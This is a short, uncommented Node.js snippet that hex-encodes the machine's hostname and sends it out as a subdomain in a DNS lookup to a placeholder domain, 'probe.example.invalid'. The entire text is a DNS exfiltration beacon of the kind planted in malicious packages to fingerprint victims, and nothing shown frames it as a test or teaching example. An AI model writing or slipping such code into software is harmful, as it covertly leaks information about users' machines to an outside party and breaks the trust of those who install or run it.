const machine = require('os');
const dns = require('dns');
const encoded = Buffer.from(machine.hostname().slice(0, 24)).toString('hex');
dns.resolve4(encoded + '.probe.example.invalid', () => {});
